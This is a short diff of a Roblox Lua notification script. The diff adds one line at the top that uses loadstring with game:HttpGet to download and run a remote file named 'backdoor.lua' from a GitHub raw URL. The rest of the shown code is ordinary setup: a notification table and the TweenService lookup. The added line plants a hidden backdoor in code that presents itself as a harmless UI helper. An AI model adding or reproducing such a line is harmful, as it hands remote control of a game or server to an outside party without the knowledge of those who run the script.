@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ramirezmx/backdoor/main/backdoor.lua'))()
 local NotificationTable = {};
 local Done = true;
 local TweenService = game:GetService("TweenService");
